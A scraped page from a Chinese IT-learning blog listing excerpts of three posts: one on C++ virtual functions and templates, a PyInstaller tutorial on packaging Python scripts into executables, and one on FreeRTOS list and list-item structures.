		在C++编程语言中，有很多高级特性和技巧可以提升代码的质量和效率。下面将介绍五个C++高级代码知识，包括虚函数、模板、智能指针、多线程和RAII。同时，我会展示一个最令自己惊叹的C++代码，并解释它的用途和用法。
一·C++高级代码知识 1·虚函数 虚函数是在基类中声明为virtual的成员函数。它的主要作用是实现动态多态性，使得在派生类中可以重写该函数，并且在运行时确定调用哪个实现。虚函数通过在基类中定义函数原型，使得派生类可以覆盖该函数，并且通过基类指针或引用调用时，能够根据对象的实际类型来调用相应的函数。虚函数的实现机制是通过在每个对象中保存一个虚函数表（vtable），其中包含了虚函数的地址，并在运行时通过对象中的vptr（虚指针）来访问正确的函数实现。虚函数的主要应用场景包括多态、接口和抽象类等。
#include &lt;iostream&gt; class Base { public: virtual void show() { std::cout &lt;&lt; "Base class\n"; } }; class Derived : public Base { public: void show() override { std::cout &lt;&lt; "Derived class\n"; } }; int main() { Base* basePtr = new Derived(); basePtr-&gt;show(); // 输出 "Derived class" delete basePtr; return 0; } 注释：虚函数允许我们使用基类指针或引用调用派生类的函数。在这个例子中，即使basePtr是指向Derived对象的基类指针，当我们调用show时，它仍然会调用Derived类的实现。
2·模板 模板是C++中的一种编程技术，它使得程序员能够编写与数据类型无关的代码。模板可以分为两类：函数模板和类模板。函数模板使用template关键字声明，并使用typename或class关键字指定类型参数。类模板使用template关键字声明类，并在类定义中使用类型参数表示类的成员变量或返回类型。模板的主要应用场景包括泛型编程、STL容器和算法等。
#include &lt;iostream&gt; #include &lt;vector&gt; template &lt;typename T&gt; void print(const std::vector&lt;T&gt;&amp; vec) { for (const auto&amp; elem : vec) { std::cout &lt;&lt; elem &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69fb65177a0e426f0967c6df7f23c4c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fd42316674f318b582af6be2d0d35f1/" rel="bookmark">
			python文件打包实战技巧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		众所周知，python是一种脚本语言，python程序必须在python环境下运行，所以如果想把自己写的程序给别人看的话，就比较麻烦，他需要先配置python环境，对于电脑小白来说这是“要命”的事情。而且如果是客户的话，也不想让对方知道源代码，那么怎样才能既保留自己的源代码同时又能让对方很方便的使用自己的程序呢?
PyInstaller的安装可以在命令行输入以下命令直接安装：
pip install PyInstaller
如果看到Successfully install PyInstaller-x.x.x就表示安装成功。(x.x.x代表版本)也可以在python官网下载。
下面开始进行文件打包
先在桌面建一个文件夹并把需要打包的代码文件放入其中。
打开文件
新建文件夹
在文件夹内空白处按住Shift并点击鼠标右键，然后点击在此处打开Powershell窗口。
命令窗口
打开命令窗口
输入以下命令开始打包：Pyinstaller test.py
出现如下图所示内容就表示打包完成了。
打包完成
打包完成
注意：由于电脑管家会把这种文件识别为木马病毒，所以出现该情况就需要自己找回文件，恢复并添加至信任区。
把文件添加到信任区
找回文件
然后再看刚才新建的文件夹，会发现多了很多文件，只需要在build文件下找到test.exe就可以了，exe后缀的文件就是电脑可执行文件，其他的文件都可以删除掉，只需要将exe文件发送给其他人，不管对方有没有python环境，他只要双击就可以运行，而且也看不到源代码。
通过上述默认打包方式就可以对代码文件进行简单的打包了，但是还是觉得不太美观，而且很多没用的文件显得冗余，所以PyInstaller还提供了其他的打包形式。
-F 只产生单个的可执行文件
-D 产生一个目录包含多个文件(exe在其中，此为默认打包方式)
-w 去除运行时出现的命令行黑窗口
-i 将ico后缀的图片作为可执行文件的图标
等等还有很多命令(可以去官网看官方文档)，最主要的就只需记住这些就行了。
它们的用法如下：pyinstaller -w -F -i favicon.ico test.py
其中favicon.ico为图标。需要放在代码文件同目录下。
然后跟第一次打包方式相同，只是输入命令的时候换成后面的。按照这种方式(只要有-F命令的)打包成功后，这时的exe可执行文件在dist文件夹下。
打开发现有且只有这个exe文件，看上去非常的简洁，而且有了图标后观赏性也大大提高了。
通过以上步骤，代码文件就打包好了。
最后 分享一份Python的学习资料，但由于篇幅有限，完整文档可以扫码免费领取！！！
1）Python所有方向的学习路线（新版）
总结的Python爬虫和数据分析等各个方向应该学习的技术栈。
比如说爬虫这一块，很多人以为学了xpath和PyQuery等几个解析库之后就精通的python爬虫，其实路还有很长，比如说移动端爬虫和JS逆向等等。
（2）Python学习视频
包含了Python入门、爬虫、数据分析和web开发的学习视频，总共100多个，虽然达不到大佬的程度，但是精通python是没有问题的，学完这些之后，你可以按照我上面的学习路线去网上找其他的知识资源进行进阶。
（3）100多个练手项目
我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了，只是里面的项目比较多，水平也是参差不齐，大家可以挑自己能做的项目去练练。
。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/181d44b6297d4a410ef39f1a012ad53b/" rel="bookmark">
			STM32 FreeRTOS列表和列表项（标准库）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 本文将系统的介绍下列表和列表项的基础，关系，一些底层逻辑等
二、列表项 结构体（在list.h中）：
struct xLIST_ITEM { listFIRST_LIST_ITEM_INTEGRITY_CHECK_VALUE;	//检查列表项完整性 configLIST_VOLATILE TickType_t xItemValue;	//列表项值 struct xLIST_ITEM * configLIST_VOLATILE pxNext;	//指向下一列表项 struct xLIST_ITEM * configLIST_VOLATILE pxPrevious;	//指向上一列表项 void * pvOwner;	//归谁所有，一般为任务控制块 void * configLIST_VOLATILE pvContainer;	//归于哪个列表，列表分为就绪列表，挂起列表，阻塞列表 listSECOND_LIST_ITEM_INTEGRITY_CHECK_VALUE;	//检查列表完整性 }; typedef struct xLIST_ITEM ListItem_t; struct xMINI_LIST_ITEM { listFIRST_LIST_ITEM_INTEGRITY_CHECK_VALUE	//检查列表项完整性 configLIST_VOLATILE TickType_t xItemValue; //列表项值 struct xLIST_ITEM * configLIST_VOLATILE pxNext; //上一列表项 struct xLIST_ITEM * configLIST_VOLATILE pxPrevious; //下一列表项 }; typedef struct xMINI_LIST_ITEM MiniListItem_t; 以上两种的区别其实并不大，就在于他们所占的内存空间
三、列表 结构体（在list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/181d44b6297d4a410ef39f1a012ad53b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/18/">«</a>
	<span class="pagination__item pagination__item--current">19/279</span>
	<a class="pagination__item pagination__item--next btn" href="/page/20/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>